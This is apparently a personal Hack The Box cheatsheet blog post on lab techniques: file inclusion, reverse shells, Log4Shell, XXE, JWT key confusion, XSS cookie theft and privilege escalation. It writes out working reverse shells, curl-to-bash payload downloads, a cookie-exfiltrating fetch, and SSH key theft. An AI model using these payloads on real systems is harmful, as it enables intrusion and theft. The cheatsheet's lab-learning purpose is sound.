<p>This is a very interesting vulnerability. It lets the attacker upload some file to the server. You can do this to start a reverse shell. That is the targeted machine establish a permanent connection to the attacker machine and it provides a shell where the attacker can run commands if it was inside the machine.</p>

<h4 id="local-file-include-lfi-">Local File Include (LFI) <a name="lfi"></a></h4>

<p>Abuse of file loading capability (for instance PHP include function) to show a local file in the browser:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=../../../../../../../../../../windows/system32/drivers/etc/hosts
</code></pre></div></div>

<p>You can try to read the following files for Linux:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/etc/hosts
/etc/passwd
</code></pre></div></div>

<p>and for Windows:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:/Windows/System32/drivers/etc/hosts
c:/windows/win.ini
</code></pre></div></div>

<h4 id="remote-file-include-rfi-">Remote File Include (RFI) <a name="rfi"></a></h4>

<p>Remote file inclusion (RFI) is an attack targeting vulnerabilities in web applications that dynamically reference external scripts.</p>

<p>This can be use to force the target make a call to a compromised host in the same network and captura the credentials challenge:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://unika.htb/index.php?page=\\10.1.2.3\blabla\
</code></pre></div></div>

<h4 id="reverse-shell-">Reverse shell <a name="reverse-shell"></a></h4>

<p>Reverse basically means that it is the target that will initiate a connection request back us (the attacker).</p>

<p>For example, once we have remote code execution in the target, we’ll be able to download and execute a piece of code.</p>

<p>Usually the process is:</p>
<ul>
  <li>Create a file in the attacker machine containing a reverse shell payload:
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
bash <span class="nt">-i</span> <span class="o">&gt;</span>&amp; /dev/tcp/&lt;YOUR_IP_ADDRESS&gt;/1337 0&gt;&amp;1
</code></pre></div>    </div>
  </li>
  <li>Create a server in the attacker machine which will act as the shell I/O. Normally this is done with <code class="language-plaintext highlighter-rouge">netcat</code>.
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-nvlp</span> 1337
</code></pre></div>    </div>
  </li>
  <li>Start a webserver in the attacker machine that will server the reserve shell payload. You can do that with python (in the same directory as the payload):
    <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-m</span> http.server 8000
</code></pre></div>    </div>
  </li>
  <li>Make the target machine download and execute the reverse shell payload:
    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://thetoppers.htb/shell.php?cmd=curl%20%3CYOUR_IP_ADDRESS%3E:8000/shell.sh|bash
</code></pre></div>    </div>
  </li>
</ul>

<p>You can find a list of reverse shells here: <a href="https://www.revshells.com/">https://www.revshells.com/</a></p>

<p>Once you have shell access, you can try to get a improve the shell if python is installed:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
</code></pre></div></div>
<p>or</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>script /dev/null <span class="nt">-c</span> bash
</code></pre></div></div>
<p>or</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty;pty.spawn("/bin/bash")'</span>
CTRL+Z
<span class="nb">stty </span>raw <span class="nt">-echo</span>
<span class="nb">fg
export </span><span class="nv">TERM</span><span class="o">=</span>xterm
</code></pre></div></div>

<p>Or, you can find mmore methods to improve the shell here: <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/">https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/</a></p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h4 id="rogue-servers-">Rogue servers <a name="rogue"></a></h4>

<p>The idea of rogue server is to start a server in the attacker machine and make the target machine speaks with the attacker server. This is used for instance to retrieve NTLM hash challenge or to explot log4j vulnerability.</p>

<h5 id="ntlm-">NTLM <a name="ntlm"></a></h5>

<p>Windows New Technology LAN Manager (NTLM) is a suite of security protocols offered by Microsoft to authenticate users’ identity and protect the integrity and confidentiality of their activity. At its core, NTLM is a single sign on (SSO) tool that relies on a challenge-response protocol to confirm the user without requiring them to submit a password.</p>

<p>In order to mess with it, you might use the <a href="https://github.com/lgandx/Responder">responder tool</a></p>

<p>The idea to bypass the NTLM is to force the target authenticate against a rogue SMB server (provided by <code class="language-plaintext highlighter-rouge">responder</code> tool). This tool will capture the authentication challenge hash and then you can use <code class="language-plaintext highlighter-rouge">john</code> tool to compare the hash with a dictionary to see if any entry matches.</p>

<p>For reference check: <a href="/pentesting-tools/">pentesting tools.</a></p>

<h5 id="log4jshell-">Log4jShell <a name="log4j-shell"></a></h5>

<p>It was discovered that log4j libraries for certain versions were vulnerable to remote code execution. In order to do so, you setup a rogue JNDI/LDAP server from <a href="https://github.com/veracode-research/rogue-jndi">https://github.com/veracode-research/rogue-jndi</a>in the attacker machine and send a JNDI command to the target machine to communicate with the rogue LDAP server to get a revershe shell on the attacker machine.</p>

<p>E.g.:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>java <span class="nt">-jar</span> target/RogueJndi-1.1.jar <span class="nt">--command</span> <span class="s2">"bash -c
{echo,YmFzaCAtYyBiYXNoIC1pID4mL2Rldi90Y3AvMTAuMTAuMTQuMzMvNDQ0NCAwPiYxCg==}|{base64,-
d}|{bash,-i}"</span> <span class="nt">--hostname</span> <span class="s2">"10.10.14.33"</span>
</code></pre></div></div>
<p>Start the rogue JNDI server that will start a reverse shell on 10.10.14.33 using the base64 payload provided.</p>

<p>Then, send the payload to force the target machine connect the rogue JNDI/LDAP server:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${jndi:ldap://{Your Tun0 IP}:1389/o=tomcat}
</code></pre></div></div>

<h4 id="search-for-vulnerabilities-">Search for vulnerabilities <a name="search-vuln"></a></h4>

<p>If you can establish the version of the service running, you can query for any known vulnerability of that version:</p>

<p><a href="https://cve.mitre.org/cve/search_cve_list.html">https://cve.mitre.org/cve/search_cve_list.html</a></p>

<h4 id="xml-external-entities-">XML eXternal Entities <a name="xxe"></a></h4>

<p>If the application is using XML to process any input data, it might be vulnerable to this kind of attacks.</p>

<p>This attack works because the XML parser usually are configured with support for XML external entities. This is a feature of XML to be able to define objects outside the defined structure, but can be abuse to list internal files or to make connections to the outside of the target machine.</p>

<p>In order to check if the machine is vulnerable to this attack, you can try to show the contents of <code class="language-plaintext highlighter-rouge">/etc/hosts</code>(Linux) or <code class="language-plaintext highlighter-rouge">C:/Windows/System32/drivers/etc/hosts</code>(Windows). e.g.:</p>

<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version = "1.0"?&gt;</span>
<span class="cp">&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts" &gt;</span>]&gt;
<span class="nt">&lt;order&gt;&lt;quantity&gt;</span>2<span class="nt">&lt;/quantity&gt;&lt;item&gt;</span><span class="ni">&amp;xxe;</span><span class="nt">&lt;/item&gt;&lt;address&gt;</span>Fake street 1234<span class="nt">&lt;/address&gt;&lt;/order&gt;</span>
</code></pre></div></div>

<h4 id="jwt-key-confussion-attack-">JWT Key confussion attack <a name="jwt-confussion"></a></h4>

<p>JWT Tokens are a way to sign and verify tokens that can contain important data such as credencials, roles, etc…</p>

<p>They have two ways of working: asymetric (RSA) and symmetric. In asymetric the token is signed with the private key and can be verified with the public key. In symmetric, the token is signed with a shared secret.</p>

<p>This signing and verifing is very important because it ensures that nobody modifies the tokens.</p>

<p>However, for old unsecure version of the libraries that handles this, it is possible to modify the payload and sign with the public key (if you are lucky enough to get it). When we change the signing algorithm, we are telling the other side that we’re using symmetric algorithm.</p>

<p>See the following example:</p>

<p>In the received side, the token is verified using symmetric and asymmetric algorithms:</p>
<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">async</span> <span class="nx">decode</span><span class="p">(</span><span class="nx">token</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">return</span> <span class="p">(</span><span class="k">await</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">token</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">'</span><span class="s1">RS256</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">]</span> <span class="p">}));</span>
<span class="p">}</span>
</code></pre></div></div>
<p>First, it will try with RSA (RS) and later with Hash (HS) if the previous fails.</p>

<p>This way in the client side, we can modify the payload and sign the payload by changing the signing algorithm:</p>

<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">fs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">fs</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">jwt</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">jsonwebtoken</span><span class="dl">'</span><span class="p">);</span>

<span class="kd">const</span> <span class="nx">publicKey</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./public.key</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>
<span class="kd">const</span> <span class="nx">validJwtToken</span>  <span class="o">=</span> <span class="nx">fs</span><span class="p">.</span><span class="nx">readFileSync</span><span class="p">(</span><span class="dl">'</span><span class="s1">./jwt-token.txt</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">utf8</span><span class="dl">'</span><span class="p">);</span>

<span class="nx">decoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">verify</span><span class="p">(</span><span class="nx">validJwtToken</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span> <span class="na">algorithms</span><span class="p">:</span> <span class="p">[</span><span class="dl">"</span><span class="s2">RS256</span><span class="dl">"</span><span class="p">]})</span>
<span class="nx">decoded</span><span class="p">[</span><span class="dl">"</span><span class="s2">username</span><span class="dl">"</span><span class="p">]</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">admin' AND 1=2 UNION SELECT 1,top_secret_flaag,3 FROM flag_storage  -- -</span><span class="dl">"</span>
<span class="nx">re_encoded</span> <span class="o">=</span> <span class="nx">jwt</span><span class="p">.</span><span class="nx">sign</span><span class="p">(</span><span class="nx">decoded</span><span class="p">,</span> <span class="nx">publicKey</span><span class="p">,</span> <span class="p">{</span><span class="na">algorithm</span><span class="p">:</span> <span class="dl">'</span><span class="s1">HS256</span><span class="dl">'</span><span class="p">})</span>

<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">re_encoded</span><span class="p">)</span>
</code></pre></div></div>
<p>Here, we are using the public key to verify the received token, as the regular way.</p>

<p>Then, we change the payload and we sign again to generate the JWT. We use the public key and we change the algorithm to Hash. This way the received will verify the token using the public key. It will first fail with the asymmetric but it will work with the symmetric algorithm.</p>

<p>In this case, we are modifying the token to retrieve something from the database using an SQL injection.</p>

<h4 id="cross-site-scripting-xss-">Cross-Site Scripting (XSS) <a name="xss"></a></h4>

<p>This is a massive vulnerability. It consist on a web application accepting input from the user. If the input is not sanitized, the attacker might be able to write HTML in the input form. This HTML can include malicious javascript code.</p>

<p>Let’s imagine we have an application with a form with no sanitized input. On another view we list that input. An attacker can place JS code that will be executed in the other view.</p>

<p>E.g.</p>
<ol>
  <li>Create a payload file that will send the interesting data (in our case, we want to extract something from the cookie):
    <div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">fetch</span><span class="p">(</span><span class="dl">"</span><span class="s2">https://ojm5l9c8.requestrepo.com/?</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
</code></pre></div>    </div>
  </li>
  <li>Write the XSS HTML code in the input form field:
    <div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;script </span><span class="na">src=</span><span class="s">https://cdn.jsdelivr.net/gh/adriangalera/htb-cursed-secret-party-xss@master/xss.js</span><span class="nt">&gt;&lt;/script&gt;</span>
</code></pre></div>    </div>
  </li>
  <li>In the remote url (requestrepo), you’ll see the value of the <code class="language-plaintext highlighter-rouge">document.cookie</code></li>
</ol>

<p>There’s a security header in modern browsers to prevent this <code class="language-plaintext highlighter-rouge">Content Security Policy (CSP)</code>. However, if you are unlucky enough to include a CDN in that header, you are still vulnerable since one can put arbitrary code in the CDN.</p>

<h3 id="foothold-we-are-in-">Foothold, we are in <a name="foothold"></a></h3>

<p>At this point we have shell (or reverse) access to the target machine. We can start to do some interesting stuff:</p>

<h4 id="list-users-and-groups-">List users and groups <a name="list-users"></a></h4>

<p>You can query all the available users in the target by querying <code class="language-plaintext highlighter-rouge">/etc/passwd</code>.</p>

<p>To retrieve the details about the current shell user, you can do <code class="language-plaintext highlighter-rouge">id</code> command. It will list the groups that the user belong. This might be useful for privilege escalation.</p>

<p>You can also list the binaries the user or group has access:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
</code></pre></div></div>

<h4 id="search-for-interesting-keywords-">Search for interesting keywords <a name="search-keywords"></a></h4>

<p>You can search inside the contents of files for interesting contents (passwords):</p>

<p>Let’s image someone decided to hardcode a username/password in one file in a web server. You can find it checking the files one by one or, you can use grep to search all files for interesting keywords:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">grep</span> <span class="nt">-Ril</span> <span class="s1">'passwd*'</span> /var/www/html
</code></pre></div></div>

<p>-R recursive
-i ignore case
-l show the file, not the match</p>

<h4 id="local-port-forwarding-">Local port forwarding <a name="local-port-forwarding"></a></h4>

<p>Imagine you gain access to a machine which is running a service only for localhost. You can make that service available outside localhost by doing local port forwarding. e.g funnel.htb server is running postgres on port 5432.</p>

<p>With the next command, we’ll do a SSH tunnel between localhost:5432 and funnel.htb:5432 port</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh <span class="nt">-L</span> 5432:localhost:5432 christine@funnel.htb
</code></pre></div></div>

<h4 id="lateral-movement-">Lateral movement <a name="lateral-movement"></a></h4>

<p>Normally when the attacker get shell acess, the user has very few permissions. The attacker should check for credentials (inside database, inside files), etc… to switch from a low-permission user to a user with more permissions. That’s called lateral movement and it’s a step forward privilege escalation.</p>

<h4 id="search-for-ssh-keys-">Search for SSH keys <a name="ssh-keys"></a></h4>

<p>Once we got shell access to a machine, it might be worth to try to retrieve the SSH private keys for the user. In order to do so, we must check the <code class="language-plaintext highlighter-rouge">.ssh</code> folder in the user home:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/home/michael/.ssh/id_rsa
c/users/daniel/.ssh/id_rsa
</code></pre></div></div>

<p>Paste the contents of that private key into the attacker machine and run:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>chmod 4000 michael-id-rsa
ssh -i michael-id-rsa michael@target.htb
</code></pre></div></div>

<h3 id="privilege-escalation-">Privilege escalation <a name="privilege-escalation"></a></h3>

<p>At this point we have shell (or reverse) access to the target machine, however, want to achieve root (or Administrator) access to the target machine. The mecanism might differ depending on the application or OS we’re exploting.</p>

<h3 id="privilege-escalation-on-windows-">Privilege escalation on Windows <a name="privilege-escalation-windows"></a></h3>

<p>You can use <a href="https://github.com/carlospolop/PEASS-ng">https://github.com/carlospolop/PEASS-ng</a>.</p>

<p>You need to run the executable file in the target Windows machine. The script will identify the possible vulnerabilities to explot and gain admin access.</p>

<p>It might be possible that the password of the admin user has been pasted in the history of the shell. Check the output of winpeas for references to <code class="language-plaintext highlighter-rouge">ConsoleHost_history.txt</code> file.</p>

<p>Another interesting path to privilege escalation is to check the permissions of a file. In order to do so, run <code class="language-plaintext highlighter-rouge">icacls</code> command. (F) means <code class="language-plaintext highlighter-rouge">Full access</code> and is a promising way of privilege escalation.</p>

<p>You can potentially modify a script and make it open a reverse shell with netcat.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo </span>C:<span class="se">\L</span>og-Management<span class="se">\n</span>c64.exe <span class="nt">-e</span> cmd.exe <span class="o">{</span>your_IP<span class="o">}</span> <span class="o">{</span>port<span class="o">}</span> <span class="o">&gt;</span> C:<span class="se">\L</span>og-Management<span class="se">\j</span>ob.bat
</code></pre></div></div>

<p>When the script is executed, you’ll get a shell in the attacker netcat</p>

<h3 id="privilege-escalation-on-linux-">Privilege escalation on Linux <a name="privilege-escalation-linux"></a></h3>

<p>First, check what permissions <code class="language-plaintext highlighter-rouge">sudo</code> permissions the user has with <code class="language-plaintext highlighter-rouge">sudo -l</code>.</p>

<p>Also, check the binaries accessible to the group of the user:</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>find / <span class="nt">-group</span> bugtracker 2&gt;/dev/null
</code></pre></div></div>
<h4 id="set-owner-user-id-">Set owner User ID <a name="privilege-escalation-suid"></a></h4>

<p>If any, check the file flags and permissions:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-lisa</span> /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
&lt;isa /usr/bin/bugtracker <span class="o">&amp;&amp;</span> file /usr/bin/bugtracker
264151 12 <span class="nt">-rwsr-xr--</span> 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib64/l, <span class="k">for </span>GNU/Linux 3.2.0, BuildID[sha1]<span class="o">=</span>b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
</code></pre></div></div>

<p>The flags show <code class="language-plaintext highlighter-rouge">s</code> and file shows <code class="language-plaintext highlighter-rouge">setuid</code>. That is a special permission named SUID or Set Owner User ID. SUID allows an alternate user to run an executable with the same permissions as the owner of the file instead of the permissions of the alternate user. That looks promising for privilede escalation.</p>

<p>In our case, the binary ‘bugtracker’ is owned by root &amp; we can execute it as root since it has SUID set.</p>

<p>If we execute the app, we can see that is asking for input. On invalid input it shows an error showing that it’s using <code class="language-plaintext highlighter-rouge">cat</code> command:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>robert@oopsie:/var/www/html<span class="nv">$ </span>bugtracker 12
bugtracker 12

<span class="nt">------------------</span>
: EV Bug Tracker :
<span class="nt">------------------</span>

Provide Bug ID: 12
12
<span class="nt">---------------</span>

<span class="nb">cat</span>: /root/reports/12: No such file or directory
</code></pre></div></div>
<p>Looks like it’s not using the full path of the cat tool. We can create a executable named <code class="language-plaintext highlighter-rouge">cat</code> and put it before in PATH and it will execute that <code class="language-plaintext highlighter-rouge">cat</code> (/tmp/cat) instead of the real <code class="language-plaintext highlighter-rouge">cat</code>:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "/bin/sh" &gt; /tmp/cat
robert@oopsie:/var/www/html$ export PATH=/tmp:$PATH
robert@oopsie:/var/www/html$ echo $PATH
/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games
robert@oopsie:/var/www/html$ bugtracker	
bugtracker

------------------
: EV Bug Tracker :
------------------

Provide Bug ID: 12
12
---------------

# whoami
whoami
root
</code></pre></div></div>

<p>and we have root access.</p>

<h4 id="abuse-regular-application-">Abuse regular application <a name="privilege-escalation-app"></a></h4>

<p>If <code class="language-plaintext highlighter-rouge">sudo -l</code> shows permission for any binary, check <a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a> for a way to exploit the binary to gain root access.</p>

<p>E.g.: you can get root access with vim. If the user has sudo access to edit some file, you can abuse it to get root access:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>vi
:set <span class="nv">shell</span><span class="o">=</span>/bin/sh
:shell
</code></pre></div></div>

<p>Another case, might be seeing a unix socket (docker or lxd) with potential root permissions, in that case check in hacktrics: <a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation">https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation</a></p>]]></content><author><name></name></author><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><category term="linux" /><category term="hacking" /><category term="hack-the-box" /><category term="pentesting" /><summary type="html"><![CDATA[I keep this page as a reference to the steps I take to solve puzzles from https://www.hackthebox.com/]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" /><media:content medium="image" url="https://www.agalera.eu/assets/img/posts/hack-the-box-cheatsheet/featured.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>